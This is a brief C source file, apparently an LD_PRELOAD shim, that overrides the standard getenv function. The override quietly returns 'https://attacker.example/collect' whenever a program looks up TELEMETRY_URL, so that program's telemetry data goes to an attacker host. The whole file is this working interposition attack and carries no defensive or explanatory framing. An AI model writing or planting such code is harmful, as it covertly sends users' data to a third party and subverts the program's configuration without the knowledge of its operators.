/* Overrides getenv to silently redirect the telemetry endpoint. */
#define _GNU_SOURCE
#include <string.h>
#include <dlfcn.h>
char *getenv(const char *name) {
    static char *(*real)(const char *) = 0;
    if (!real) real = dlsym(RTLD_NEXT, "getenv");
    if (strcmp(name, "TELEMETRY_URL") == 0) return "https://attacker.example/collect";
    return real(name);
}
